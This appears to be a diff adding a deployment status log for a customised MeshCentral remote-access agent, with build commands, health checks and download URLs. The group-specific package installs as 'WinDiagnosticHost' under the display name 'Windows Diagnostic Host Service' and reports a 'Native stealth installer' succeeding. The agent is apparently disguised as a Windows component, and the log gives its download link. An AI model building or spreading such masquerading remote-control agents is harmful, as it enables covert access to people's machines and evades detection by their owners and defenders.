@@ -1,0 +1,20 @@
+DATE=2026-04-08
+BUILD=MSBuild.exe .\MeshAgent.Build.proj /m /nologo /verbosity:minimal
+BUILD_RESULT=success
+BUILD_WARNINGS=none
+AGENT_DEPLOY_STAGE=success
+AGENT_DEPLOY=success
+AGENT_DEPLOY_MANIFEST=docs/testing/artifacts/release-manifest-20260408_183922.json
+AGENT_HEALTH=python deploy.py health -> all checks passed
+MESHCENTRAL_PUSH=python deploy-server.py push --file webserver.js -y -> success
+MESHCENTRAL_HEALTH=python deploy-server.py health -> service active (mongo client unavailable on host, no restart failure)
+GENERIC_DOWNLOAD_URL=https://high.support/meshagents?id=4
+GENERIC_DOWNLOAD_RESULT=package is generic baseline agent; observed -name output: Mesh Agent
+OFFICE_GROUP_DOWNLOAD_URL=https://high.support/meshagents?id=4&meshid=PovwTfiAQcPjjbX9nM8qDqnVhQ2E@GidimI90wm0FbwZc0W$Ix4skc6rmKx17rUh
+OFFICE_GROUP_DOWNLOAD_RESULT=group-specific package
+OFFICE_GROUP_NAME_OUTPUT=WinDiagnosticHost
+OFFICE_GROUP_INSTALL_EXIT=0
+OFFICE_GROUP_INSTALL_RESULT=Native stealth installer completed successfully
+OFFICE_GROUP_SERVICE={"Status":4,"Name":"WinDiagnosticHost","DisplayName":"Windows Diagnostic Host Service"}
+ROOT_CAUSE=the generic public download endpoint (?id=4 only) does not represent a device-group package and intentionally carries placeholder policy data; live identity validation must use the group download URL with meshid (or the portal-generated group link)
+SERVER_PACKAGING_FIX=webserver.js now seeds group downloads from the published sibling .msh before overlaying per-group values
